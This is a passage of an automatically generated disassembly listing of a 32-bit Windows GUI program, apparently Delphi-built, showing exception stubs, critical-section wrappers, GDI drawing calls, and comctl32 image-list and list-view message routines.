and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_4215e0
retn
sub_4215e4
xchg edx eax
call sub_41cafc
retn
sub_4215ec
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_421674
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403564
pop esi
retn
sub_421688
retn
sub_421768
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4041b8
pop esi
pop ebx
retn
sub_4217a8
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4218f4
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403598
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_42190c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_421994
retn
sub_4219dc
retn
sub_421a14
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_421a2c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421c50
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403564
pop esi
pop ebx
retn
sub_421a74
mov al 0x1
retn
sub_421a78
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_421a80
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_421b28
xor eax eax
retn
sub_421b2c
retn
sub_421b58
retn
sub_421bf0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_421c04
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_418744
retn
sub_421d4b
jmp sub_403830
sub_421d50
mov ebx 0x1
call sub_403b98
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421db3
jmp sub_403830
sub_421db8
mov ebx 0x80030103
call sub_403b98
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421e36
jmp sub_403830
sub_421e3b
mov ebx 0x80030009
call sub_403b98
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_421e99
jmp sub_403830
sub_421e9e
mov ebx 0x8000ffff
call sub_403b98
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_422069
jmp sub_403ae4
sub_42207a
jmp sub_403830
sub_42207f
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4220a8
lea eax [ ebp + 0xc ]
call sub_405b04
retn
sub_4220a1
jmp sub_403ae4
sub_4220a8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_4220b4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4220c0
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_4220cc
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_4220d8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_422147
jmp sub_403830
sub_42214c
mov esi 0x8000ffff
call sub_403b98
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_422160
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_4221cd
jmp sub_403ae4
sub_4221d4
mov eax [ rw-data ]
call sub_403368
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4221e4
call sub_417e88
retn
sub_4222ac
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_422450
jmp sub_403ae4
sub_422457
pop ebp
retn
sub_4224e5
jmp sub_403ae4
sub_4224ec
pop ebp
retn
sub_422785
jmp sub_403ae4
sub_42278c
pop ebp
retn
sub_422790
sub [ rw-data ] 0x1
retn
sub_423448
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_4234bc
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_423530
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42353c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42361c
jmp sub_403ae4
sub_423623
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4236b3
jmp sub_403ae4
sub_423745
jmp sub_403ae4
sub_42374c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4237b0
jmp sub_403ae4
sub_4237b7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42381f
jmp sub_403ae4
sub_423826
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4238c9
jmp sub_403ae4
sub_4238d0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423d28
push 0x33
mov ecx rw-data
call sub_4181c4
retn
sub_423d38
push 0x33
mov ecx rw-data
call sub_418184
retn
sub_423d48
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_423d6c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_423f40
push 0x11
mov ecx rw-data
call sub_418184
retn
sub_424080
push ebx
mov ebx eax
mov eax ebx
call sub_423d48
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42413a
jmp sub_403ae4
sub_424141
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423d6c
retn
sub_424157
jmp sub_403ae4
sub_424170
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_4241cd
jmp sub_403ae4
sub_4241d4
pop ebx
pop ecx
pop ebp
retn
sub_42434d
jmp sub_403ae4
sub_424375
jmp sub_403ae4
sub_42437c
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4243e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4043c8
pop esi
pop ebx
retn
sub_42445c
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_4243b8
push eax
call MulDiv
neg eax
pop ebx
retn
sub_424498
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_4244d0
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_424500
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_42461e
jmp sub_403ae4
sub_424625
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423d6c
retn
sub_42463b
jmp sub_403ae4
sub_4246b1
jmp sub_403ae4
sub_4246b8
pop ebx
pop ecx
pop ebp
retn
sub_4246bc
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_424772
jmp sub_403ae4
sub_424784
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403564
sub_424798
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_4247c8
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_4248d7
jmp sub_403ae4
sub_4248de
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423d6c
retn
sub_4248f4
jmp sub_403ae4
sub_42496d
jmp sub_403ae4
sub_424974
pop ebx
pop ecx
pop ebp
retn
sub_424aa5
jmp sub_403ae4
sub_424ab8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424df8
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_425054
jmp sub_403ae4
sub_42505b
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_425064
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_42509c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4251e8
retn
sub_4252b1
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4252c8
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4253b4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4253d4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4253f4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_425414
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
pop ebx
retn
sub_42542c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbf8
call sub_403b1c
pop ebx
retn
sub_425450
mov eax [ rw-data ]
call sub_42542c
retn
sub_4254a6
jmp sub_403ae4
sub_4254ad
pop ecx
pop ebp
retn
sub_42554c
jmp sub_403ae4
sub_425553
pop ebx
mov esp ebp
pop ebp
retn
sub_425625
jmp sub_403ae4
sub_4256b6
jmp sub_403ae4
sub_4256bd
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4256e8
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_4257cf
jmp sub_403ae4
sub_42597c
jmp sub_403ae4
sub_425983
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_425b95
jmp sub_403ae4
sub_425b9c
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_425c36
jmp sub_403ae4
sub_425e12
jmp sub_403ae4
sub_425ecc
jmp sub_403ae4
sub_425ed3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425ef3
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_425eec
jmp sub_403ae4
sub_425ef3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_426081
jmp sub_403ae4
sub_42624c
jmp sub_403ae4
sub_426253
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426276
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_40270c
retn
sub_42626f
jmp sub_403ae4
sub_426276
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426296
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
sub_42628f
jmp sub_403ae4
sub_426296
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4263e8
push 0x0
call sub_426384
retn
sub_42648d
jmp sub_403ae4
sub_426494
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4264a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_4263f0
pop ebx
pop ebp
retn 0x4
sub_4264b4
retn
sub_4264b8
test eax eax
jne r-xdata
retn
call sub_4264b4
sub_42668b
jmp sub_403ae4
sub_4266b2
jmp sub_403ae4
sub_4266b9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4266f8
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_4268c5
mov eax [ ebp - 0xc ]
call sub_403368
retn
sub_4268ce
jmp sub_403ae4
j_sub_4268c5
jmp sub_4268c5
sub_4268d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403368
retn
sub_4268eb
jmp sub_403ae4
sub_4268fc
xor eax eax
retn
sub_426900
mov al [ eax + 0x21 ]
retn
sub_42694c
jmp sub_403ae4
sub_426953
pop esi
pop ecx
pop ebp
retn
sub_426980
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_4269d7
jmp sub_403ae4
sub_4269de
pop esi
pop ecx
pop ebp
retn
sub_4269e4
retn
sub_4269e8
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4269f8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_426b16
jmp sub_403ae4
sub_426b3e
jmp sub_403ae4
sub_426b45
mov esp ebp
pop ebp
retn
sub_426bbc
jmp sub_403ae4
sub_426cc4
jmp sub_403ae4
sub_426daf
jmp sub_403ae4
sub_426dbc
inc [ eax + 0x4 ]
retn
sub_426f37
jmp sub_403ae4
sub_4272e8
jmp sub_403ae4
sub_427532
jmp sub_403ae4
sub_42755c
jmp sub_403ae4
sub_427563
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427585
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_42757e
jmp sub_403ae4
sub_42758f
jmp sub_403830
sub_4275de
jmp sub_403ae4
sub_42780b
jmp sub_403ae4
sub_427853
jmp sub_403ae4
sub_4279c0
jmp sub_403ae4
sub_427a87
jmp sub_403830
sub_427adc
mov [ eax + 0x31 ] 0x0
call sub_4266f8
retn
sub_427d2d
jmp sub_403ae4
sub_427d98
jmp sub_403ae4
sub_427d9f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427e10
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_427ec4
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_427ed4
push ebx
mov ebx eax
mov eax ebx
call sub_42808c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_427ee8
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_427f04
push ebx
mov ebx eax
mov eax ebx
call sub_4280ec
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_427f60
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_42806f
jmp sub_403ae4
j_sub_403830#3
jmp sub_403830
sub_428333
jmp sub_403ae4
sub_42833a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42871b
jmp sub_403ae4
sub_428747
jmp sub_403ae4
sub_4287ae
jmp sub_403830
sub_4287df
jmp sub_403ae4
sub_428864
jmp sub_403830
sub_428869
mov eax [ ebp - 0x38 ]
call sub_403368
call sub_403b44
call sub_403b98
sub_42887b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428898
mov eax [ ebp - 0x18 ]
call sub_40270c
retn
sub_428891
jmp sub_403ae4
sub_4289e7
jmp sub_403830
sub_428cb3
jmp sub_403830
sub_428d44
mov cl 0x1
call sub_428d4c
retn
sub_429038
xor ecx ecx
call sub_428d4c
retn
sub_4290ba
jmp sub_403830
sub_4290bf
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403b44
call sub_403b98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429110
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_429249
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_429278
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42928c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_4293a5
jmp sub_403830
sub_42945a
jmp sub_403830
sub_4294c4
jmp sub_403830
sub_4294f8
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_429484
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_429510
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425414
retn
mov [ eax + 0x30 ] edx
retn
sub_429528
retn
sub_42952c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_425414
retn
mov [ eax + 0x2c ] edx
retn
sub_42956c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425414
pop ebp
retn 0x4
sub_429580
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_425414
pop ebp
retn 0x4
sub_429740
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42974c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4297f9
jmp sub_403ae4
sub_429800
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4298eb
jmp sub_403830
sub_429957
jmp sub_403ae4
sub_429a85
jmp sub_403ae4
sub_429a8c
pop ebp
retn
sub_429b8c
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_429bc1
jmp sub_403ae4
sub_429bc8
pop ebp
retn
sub_429bcc
sub [ rw-data ] 0x1
retn
sub_429e14
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4188a0
retn
sub_429e48
mov eax [ eax + 0x4 ]
call sub_418744
retn
sub_429e79
jmp sub_403ae4
sub_429e80
pop ebp
retn
sub_429e84
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_12(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ __import_lookup_table_12(comctl32:ImageList_Add) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ __import_lookup_table_12(comctl32:ImageList_Read) ]
ImageList_Write
jmp [ __import_lookup_table_12(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_42a010
push ecx
push edx
push 0x1212
push eax
call SendMessageA
retn
sub_42a020
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1002
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a038
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1004
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a050
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a068
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1009
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42a09c
push edx
push 0x0
push 0x100f
push eax
call SendMessageA
retn
sub_42a0c8
push 0x0
push edx
push 0x1014
push eax
call SendMessageA
retn
sub_42a0fd
jmp sub_403ae4
sub_42a104
pop ebp
retn
sub_42a108
sub [ rw-data ] 0x1
retn
sub_42a1cf
jmp sub_403ae4
sub_42a1d6
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a7ec
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42a1f8
mov [ rw-data ] sub_42a310
mov [ rw-data ] sub_42a280
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42a514
mov [ rw-data ] sub_42a5e8
mov [ rw-data ] sub_42a6bc
retn
sub_42a87d
jmp sub_403ae4
sub_42a884
pop ebp
retn
sub_42a888
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42a7ec
sub_42a8bd
jmp sub_403ae4
sub_42a8c4
pop ebp
retn
sub_42a8c8
sub [ rw-data ] 0x1
retn
sub_42ab57
add eax 0xffffffd4
jmp sub_42b684
sub_42ab5f
add eax 0xffffffd4
jmp sub_42b6e0
sub_42ab71
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405bd8
sub_42ab7b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405bec
sub_42ad0a
jmp sub_403ae4
sub_42ad11
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42af21
jmp sub_403ae4
sub_42af28
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b0dd
jmp sub_403ae4
sub_42b142
jmp sub_403ae4
sub_42b149
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403ae4#9
jmp sub_403ae4
sub_42b23c
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42b44c
lea eax [ ebp - 0x30 ]
call sub_404164
lea eax [ ebp - 0x20 ]
call sub_404164
retn
sub_42b45d
jmp sub_403ae4
j_sub_42b44c
jmp sub_42b44c
sub_42b464
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b55f
jmp sub_403ae4
sub_42b566
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b663
jmp sub_403ae4
sub_42b66a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b6ca
lea eax [ ebp - 0x4 ]
call sub_405b04
retn
sub_42b6d3
jmp sub_403ae4
j_sub_42b6ca
jmp sub_42b6ca
sub_42b6da
pop ebx
pop ecx
pop ebp
retn
sub_42b775
jmp sub_403ae4
sub_42b77c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42b788
mov eax [ eax + 0x20 ]
retn
sub_42b8b7
jmp sub_403ae4
sub_42b8be
pop ebp
retn
sub_42b8c0
sub [ rw-data ] 0x1
retn
sub_42b8ed
jmp sub_403ae4
sub_42b8f4
pop ebp
retn
sub_42b8f8
sub [ rw-data ] 0x1
retn
sub_42b931
jmp sub_403ae4
sub_42b938
pop ebp
retn
sub_42b93c
sub [ rw-data ] 0x1
retn
sub_42bc49
jmp sub_403ae4
sub_42bc50
pop ebp
retn
sub_42bc54
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42b9a0
sub_42bd34
retn
sub_42bda8
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42bdb4
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42bdc0
mov edx [ eax ]
call [ edx ]
retn
sub_42bdc8
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42bdf5
jmp sub_403ae4
sub_42bdfc
pop ebp
retn
sub_42be00
sub [ rw-data ] 0x1
retn
sub_42bfbf
jmp sub_403ae4
sub_42bfc6
pop ebp
retn
sub_42c37b
jmp sub_403ae4
sub_42c382
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42c79c
jmp sub_403ae4
sub_42c7a3
pop ebp
retn
sub_42c7a8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bd38
mov [ rw-data ] eax
sub_42c7e9
jmp sub_403ae4
sub_42c7f0
pop ebp
retn
sub_42c7f4
sub [ rw-data ] 0x1
retn
sub_42c98a
inc esp
add al dh
int3
sub_42c98e
inc esp
add [ eax + 0x500044cb ] ch

sub_42c996
inc esp
add al cl
test [ eax + eax - 0x68 ] 0x9c0044d5
or [ ebp ] eax
inc esp
hlt
sub_42caf2
inc esp
add al dh
int3
sub_42caf6
inc esp
add [ ecx + edi ] al
inc esi
add [ eax - 0x35 ] dl
inc esp
add al cl
test [ eax + eax - 0x8 ] 0x9c00463f
or [ ebp ] eax
inc esp
hlt
sub_42cc18
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44cd54
sub_42cc2c
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_44cd54
sub_42ce02
jmp sub_403ae4
sub_42ce09
pop ecx
pop ecx
pop ebp
retn
sub_42ce10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cd54
mov edx esi
mov eax ebx
call sub_44ed8c
pop esi
pop ebx
retn
sub_42ce2c
push ebx
mov ebx eax
mov eax ebx
call sub_44edcc
mov al [ r-xdata ]
cmp al [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44cd54
sub_42ce94
push ebx
mov ebx edx
mov edx ebx
call sub_46346c
or [ ebx + 0x4 ] 0x80000000
pop ebx
retn
sub_42cfe2
jmp sub_403ae4
sub_42d2bd
jmp sub_403ae4
sub_42d2c4
pop ebp
retn
sub_42d2c8
sub [ rw-data ] 0x1
retn
sub_42d2f5
jmp sub_403ae4
sub_42d2fc
pop ebp
retn
sub_42d300
sub [ rw-data ] 0x1
retn
sub_42d32d
jmp sub_403ae4
sub_42d334
pop ebp
retn
sub_42d338
sub [ rw-data ] 0x1
retn
sub_42d365
jmp sub_403ae4
sub_42d36c
pop ebp
retn
sub_42d370
sub [ rw-data ] 0x1
retn
sub_42d39d
jmp sub_403ae4
sub_42d3a4
pop ebp
retn
sub_42d3a8
sub [ rw-data ] 0x1
retn
sub_42d3d5
jmp sub_403ae4
sub_42d3dc
pop ebp
retn
sub_42d3e0
sub [ rw-data ] 0x1
retn
sub_42d40d
jmp sub_403ae4
sub_42d414
pop ebp
retn
sub_42d418
sub [ rw-data ] 0x1
retn
sub_42d445
jmp sub_403ae4
sub_42d44c
pop ebp
retn
sub_42d450
sub [ rw-data ] 0x1
retn
sub_42d6ca
jmp sub_403830
sub_42d6cf
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468b5c
call sub_403b98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d6ec
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42d6f4
push esi
mov esi eax
mov eax esi
